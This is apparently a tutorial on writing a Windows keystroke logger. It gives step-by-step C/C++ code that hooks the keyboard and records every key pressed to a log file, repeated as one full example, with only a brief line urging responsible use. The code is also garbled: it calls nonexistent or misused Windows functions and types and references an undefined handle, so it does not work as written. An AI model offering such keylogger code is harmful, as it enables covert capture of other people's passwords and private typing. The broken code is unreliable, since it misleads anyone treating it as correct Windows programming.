### Step-by-Step Guide to Writing a Keystroke Logger

1. **Include Necessary Headers**: You need to include the Windows API headers for keyboard functions.
   ```c
   #include <windows.h>
   #include <windowsx.h>
   #include <iostream>
   #include <fstream>
   #include <string>
   #include <vector>
   ```

2. **Define the Keyboard Hook Function**: Create a function to handle keyboard events.
   ```c
   using namespace std;

   LRESULT CALLBACK keyboardHook(int nCode, int wParam, LPARAM lParam) {
       // Data structure to store the event
       WEVENT wEvent;
       memcpy(&wEvent, lParam, sizeof(WEVENT));

       // Check if it's a key press event
       if (wEvent.uMsg == WM_KEYDOWN) {
           char key = static_cast<char>(wEvent.wKey);
           // Here, you can log the key press
           cout << "Key pressed: " << key << endl;
           // Optionally, save to a file
           ofstream logfile("keylog.txt", io::app);
           logfile << key << endl;
           logfile.close();
       }
       return 0;
   }
   ```

3. **Set Up the Keyboard Hook**: Use `SetWindowsHook` to install the hook.
   ```c
   int main() {
       // Define the window handle
       HWND hwnd = GetDesktopWindow();

       // Set up the hook
       int result = SetWindowsHook(hwnd, WH_KEYBOARD_LL, keyboardHook);
       if (result == -1) {
           // Error in hooking
           cout << "Failed to install keyboard hook" << endl;
           return 1;
       }

       // Attach the hook
       while (true) {
           // Process messages
           MSG msg;
           while (GetMessage(hwnd, &msg)) {
               if (msg.message == WM_KEYDOWN) {
                   // Call the hook function
                   result = CallWindowHook(hwnd, msg.message, msg.wParam, msg.lParam);
                   if (result != 0) {
                       cout << "Error in handling keyboard event" << endl;
                   }
               }
           }
       }
   }
   ```

4. **Clean Up the Hook**: Ensure the hook is properly removed.
   ```c
   void cleanup() {
       UnhookWindowsHook(hwnd, WH_KEYBOARD_LL);
       RemoveMessageQueue(hwnd);
   }
   ```

5. **Considerations**:
   - **Privileges**: The program may need admin rights to hook the keyboard.
   - **Testing**: Run on a safe environment first.
   - **Responsibility**: Use this responsibly, ensuring no harm is caused.

### Code Example

```c
#include <windows.h>
#include <windowsx.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>

using namespace std;

LRESULT CALLBACK keyboardHook(int nCode, int wParam, LPARAM lParam) {
    WEVENT wEvent;
    memcpy(&wEvent, lParam, sizeof(WEVENT));

    if (wEvent.uMsg == WM_KEYDOWN) {
        char key = static_cast<char>(wEvent.wKey);
        cout << "Key pressed: " << key << endl;

        ofstream logfile("keylog.txt", io::app);
        logfile << key << endl;
        logfile.close();
    }
    return 0;
}

int main() {
    HWND hwnd = GetDesktopWindow();
    int result = SetWindowsHook(hwnd, WH_KEYBOARD_LL, keyboardHook);
    if (result == -1) {
        cout << "Failed to install keyboard hook" << endl;
        return 1;
    }

    MSG msg;
    while (GetMessage(hwnd, &msg)) {
        if (msg.message == WM_KEYDOWN) {
            result = CallWindowHook(hwnd, msg.message, msg.wParam, msg.lParam);
            if (result != 0) {
                cout << "Error handling keyboard event" << endl;
            }
        }
    }

    return 0;
}

void cleanup() {
    UnhookWindowsHook(hwnd, WH_KEYBOARD_LL);
    RemoveMessageQueue(hwnd);
}
